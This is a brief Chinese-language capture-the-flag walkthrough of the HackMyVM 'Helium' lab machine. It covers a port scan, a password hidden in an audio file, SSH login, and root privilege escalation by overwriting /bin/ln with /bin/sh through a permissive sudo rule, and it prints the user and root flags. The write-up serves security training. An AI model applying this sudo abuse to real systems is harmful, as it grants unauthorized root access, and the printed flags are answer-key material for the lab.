# Helium

2024-11-05 https://hackmyvm.eu/machines/machine.php?vm=Helium

## IP

192.168.5.40

## Scan

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

先访问 80 web 服务发现是播放音乐，查看源码发现 Please paul, stop uploading weird .wav files using /upload_sound 发现一个用户名 paul ，提示有 /upload_sound 这个路径，访问后提示 disable or not，行不通。

在看其中的 http://192.168.5.40/bootstrap.min.css 源码，发现提示 /yay/mysecretsound.wav 进行访问，是一个音频文件，使用 audacity 进行解析，发现了一串字符：dancingpassyo 应该是一个密码。

使用 paul/dancingpassyo 进行 ssh 登陆成功，得到了 user flag：

```
paul@helium:~$ cat user.txt
ilovetoberelaxed
```

sudo -l 发现 (ALL : ALL) NOPASSWD: /usr/bin/ln 进行利用，得到 root 权限：

```
sudo ln -fs /bin/sh /bin/ln
sudo ln
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls
root.txt
# cat root.txt
ilovetoberoot
```
